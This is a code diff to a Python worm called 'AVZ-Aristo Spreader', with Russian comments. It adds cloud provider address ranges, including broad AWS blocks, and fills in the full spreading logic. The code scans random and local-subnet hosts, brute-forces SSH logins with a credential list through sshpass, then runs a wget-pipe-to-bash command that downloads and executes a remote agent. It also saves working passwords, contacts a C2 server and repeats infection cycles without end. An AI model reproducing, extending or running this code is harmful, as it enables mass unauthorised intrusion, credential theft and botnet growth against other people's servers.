@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v26.9 – облачные диапазоны, masscan на серверные порты
+# AVZ-Aristo Spreader v26.10 – облачные диапазоны, стабильный SSH
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, traceback, shutil
 from datetime import datetime, timezone, timedelta
 
@@ -60,16 +60,12 @@ def cache_port(ip, port):
     c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
     conn.commit()
 
-# Диапазоны популярных облачных провайдеров (первые 5 для примера)
+# Облачные диапазоны (Hetzner, DigitalOcean, OVH, AWS Lightsail)
 CLOUD_RANGES = [
-    "5.9.0.0/16",       # Hetzner
-    "138.201.0.0/16",   # Hetzner
-    "167.172.0.0/16",   # DigitalOcean
-    "164.90.0.0/16",    # DigitalOcean
-    "51.75.0.0/16",     # OVH
-    "188.166.0.0/16",   # DigitalOcean
-    "116.203.0.0/16",   # Hetzner
-    "78.46.0.0/15",     # Hetzner
+    "5.9.0.0/16", "138.201.0.0/16", "116.203.0.0/16", "78.46.0.0/15",
+    "167.172.0.0/16", "164.90.0.0/16", "188.166.0.0/16",
+    "51.75.0.0/16", "51.68.0.0/16",
+    "3.0.0.0/8", "18.0.0.0/8", "34.0.0.0/8"
 ]
 random.shuffle(CLOUD_RANGES)
 
@@ -80,6 +76,9 @@ GUARANTEED_IPS = [
 random.shuffle(GUARANTEED_IPS)
 
 TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
+
+def now_str():
+    return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")
 
 def random_ip():
     # 60% облачные провайдеры, 25% гарантированные, 15% случайные
@@ -100,4 +99,172 @@ def random_ip():
         if a >= 224: continue
         return f"{a}.{b}.{c}.{d}"
 
-# ... (весь остальной код спредера: ssh_brute, infect, worker, scan_cycle, main_async) без изменений, только добавлены облачные диапазоны и обновлён random_ip
+def get_local_ips():
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        return []
+    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
+    return [str(host) for host in network.hosts() if str(host) != local_ip]
+
+async def probe_port(ip, port):
+    if is_port_cached(ip, port):
+        return True
+    try:
+        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
+        w.close(); await w.wait_closed()
+        cache_port(ip, port)
+        return True
+    except:
+        return False
+
+async def ssh_brute(ip):
+    if not shutil.which("sshpass"):
+        print(f"[{now_str()}] [ERROR] sshpass не установлен", flush=True)
+        return False
+    for u, p in (SUCCESS_CREDS + CREDS):
+        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o ServerAliveInterval=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
+        try:
+            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=BRUTE_TIMEOUT)
+            if proc.returncode == 0:
+                save_success_creds(u, p)
+                return True
+        except asyncio.TimeoutError:
+            pass
+        except Exception as e:
+            print(f"[{now_str()}] [ERROR] SSH {ip}:{u}:{p} – {e}", flush=True)
+    return False
+
+def save_success_creds(username, password):
+    pair = [username, password]
+    if pair not in SUCCESS_CREDS:
+        SUCCESS_CREDS.append(pair)
+        with open(SUCCESS_CREDS_FILE, "w") as f:
+            json.dump(SUCCESS_CREDS, f)
+
+async def infect(ip, port_stats):
+    ports = PORT_LIST
+    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
+    for i, p in enumerate(ports):
+        if open_ports[i]:
+            port_stats[p] = port_stats.get(p, 0) + 1
+    if open_ports[1] and await ssh_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
+        return True
+    return False
+
+async def worker(queue, stats, port_stats, progress_cb=None):
+    while True:
+        ip = await queue.get()
+        try:
+            if await infect(ip, port_stats):
+                stats['success'] += 1
+            else:
+                stats['fail'] += 1
+        except Exception as e:
+            print(f"[{now_str()}] [ERROR] {ip}: {e}", flush=True)
+            stats['fail'] += 1
+        if progress_cb:
+            await progress_cb()
+        queue.task_done()
+
+async def scan_cycle(ips, progress_callback=None):
+    q = asyncio.Queue()
+    stats = {'success':0, 'fail':0}
+    port_stats = {}
+    count = len(ips)
+    progress_count = 0
+    start_time = time.time()
+
+    async def progress_inner():
+        nonlocal progress_count
+        progress_count += 1
+        if progress_count % 500 == 0 and progress_callback:
+            await progress_callback(progress_count, count, stats, port_stats)
+        elif progress_count % 100 == 0:
+            percent = progress_count / count * 100
+            elapsed = time.time() - start_time
+            speed = progress_count / elapsed if elapsed > 0 else 0
+            print(f"[{now_str()}] [PROGRESS] {progress_count}/{count} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | Speed: {speed:.0f} IP/s", flush=True)
+
+    for ip in ips:
+        q.put_nowait(ip)
+    tasks = [asyncio.create_task(worker(q, stats, port_stats, progress_inner)) for _ in range(MAX_CONCURRENT)]
+    await q.join()
+    for t in tasks:
+        t.cancel()
+    return stats, port_stats
+
+async def global_scan(count, progress_callback=None):
+    ips = [random_ip() for _ in range(count)]
+    return await scan_cycle(ips, progress_callback)
+
+async def local_scan(progress_callback=None):
+    ips = get_local_ips()
+    if not ips:
+        return {'success':0, 'fail':0}, {}
+    print(f"[{now_str()}] [*] Scanning local network, {len(ips)} hosts", flush=True)
+    return await scan_cycle(ips, progress_callback)
+
+async def main_async(args):
+    print(f"[{now_str()}] [*] Checking C2 connection...", flush=True)
+    try:
+        s = socket.socket()
+        s.settimeout(3)
+        s.connect((C2_HOST, C2_PORT))
+        s.sendall(b"ping")
+        s.recv(1024)
+        s.close()
+        print(f"[{now_str()}] [+] C2 reachable", flush=True)
+    except Exception as e:
+        print(f"[{now_str()}] [!] C2 unreachable: {e}", flush=True)
+
+    targets = []
+    if args.targets:
+        if os.path.exists(args.targets):
+            with open(args.targets) as f:
+                targets = [line.strip() for line in f if line.strip()]
+            print(f"[{now_str()}] [*] Loaded {len(targets)} targets from {args.targets}", flush=True)
+
+    async def gui_progress(current, total, stats, port_stats):
+        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
+        percent = current / total * 100
+        if port_str:
+            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
+        else:
+            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)
+
+    if args.local:
+        print(f"[{now_str()}] [*] Mode: local network", flush=True)
+        while True:
+            stats, port_stats = await local_scan(gui_progress)
+            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            await asyncio.sleep(30)
+    elif targets:
+        print(f"[{now_str()}] [*] Mode: targets from file", flush=True)
+        while True:
+            stats, port_stats = await scan_cycle(targets, gui_progress)
+            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            await asyncio.sleep(60)
+    else:
+        print(f"[{now_str()}] [*] Mode: global, {args.count} targets per cycle", flush=True)
+        while True:
+            stats, port_stats = await global_scan(args.count, gui_progress)
+            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            await asyncio.sleep(30)
+
+def main():
+    parser = argparse.ArgumentParser()
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
+    group.add_argument('--local', action='store_true')
+    group.add_argument('--targets', type=str, help='Path to targets file')
+    args = parser.parse_args()
+    try:
+        asyncio.run(main_async(args))
+    except KeyboardInterrupt:
+        print(f"[{now_str()}] [*] Spreader stopped", flush=True)
+
+if __name__ == '__main__':
+    main()
